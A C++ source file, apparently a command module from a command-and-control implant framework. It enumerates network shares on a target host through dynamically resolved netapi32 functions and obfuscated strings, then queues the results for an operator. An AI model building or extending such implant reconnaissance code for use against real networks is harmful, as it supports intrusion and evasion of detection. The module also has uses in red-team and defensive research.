#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NET_SHARES

using namespace stardust;
using namespace starburst;

typedef struct _SHARE_INFO_1 {
    LPWSTR shi1_netname;
    DWORD  shi1_type;
    LPWSTR shi1_remark;
} SHARE_INFO_1;

typedef DWORD (WINAPI *fn_NetShareEnum)( LPWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD );
typedef DWORD (WINAPI *fn_NetApiBufferFree)( LPVOID );

auto declfn starburst::cmd_net_shares(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "netapi32.dll" ) ) );
    if ( !h_netapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
        return;
    }

    auto pNetShareEnum = reinterpret_cast<fn_NetShareEnum>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetShareEnum" ) ) );
    auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
    if ( !pNetShareEnum || !pNetApiBufferFree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );

    wchar_t w_host[256] = { 0 };
    wchar_t* p_host = nullptr;
    if ( host_str && host_len > 0 ) {
        char host_buf[256] = { 0 };
        memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
        p_host = w_host;
    }

    LPBYTE buf = nullptr;
    DWORD entries_read = 0, total_entries = 0;
    DWORD resume = 0;

    DWORD status = pNetShareEnum(
        p_host, 1, &buf, 0xFFFFFFFF,
        &entries_read, &total_entries, &resume );

    if ( status != 0 && status != 234 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NetShareEnum failed" ) ) );
        return;
    }

    uint32_t out_cap = 16384;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pNetApiBufferFree( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    str_copy( output + off, symbol<char*>( const_cast<char*>(
        "Name\tType\tRemark\n" ) ) );
    off = str_len( output );

    auto shares = reinterpret_cast<SHARE_INFO_1*>( buf );
    for ( DWORD i = 0; i < entries_read && off + 520 < out_cap; i++ ) {
        // share name
        if ( shares[i].shi1_netname ) {
            char name[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, shares[i].shi1_netname, -1, name, 260, nullptr, nullptr );
            uint32_t nlen = str_len( name );
            memory::copy( output + off, name, nlen );
            off += nlen;
        }
        output[off++] = '\t';

        // type - base type is in low word
        DWORD base_type = shares[i].shi1_type & 0x0FFFFFFF;
        BOOL is_special = ( shares[i].shi1_type & 0x80000000 ) != 0;

        switch ( base_type ) {
            case 0:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Disk" ) ) );
                off += 4;
                break;
            case 1:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Print" ) ) );
                off += 5;
                break;
            case 2:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Device" ) ) );
                off += 6;
                break;
            case 3:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "IPC" ) ) );
                off += 3;
                break;
            default:
                str_copy( output + off, symbol<char*>( const_cast<char*>( "Unknown" ) ) );
                off += 7;
                break;
        }
        if ( is_special ) {
            str_copy( output + off, symbol<char*>( const_cast<char*>( " (Special)" ) ) );
            off += 10;
        }
        output[off++] = '\t';

        // remark
        if ( shares[i].shi1_remark ) {
            char remark[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, shares[i].shi1_remark, -1, remark, 260, nullptr, nullptr );
            uint32_t rlen = str_len( remark );
            memory::copy( output + off, remark, rlen );
            off += rlen;
        }

        output[off++] = '\n';
    }

    output[off] = '\0';
    pNetApiBufferFree( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
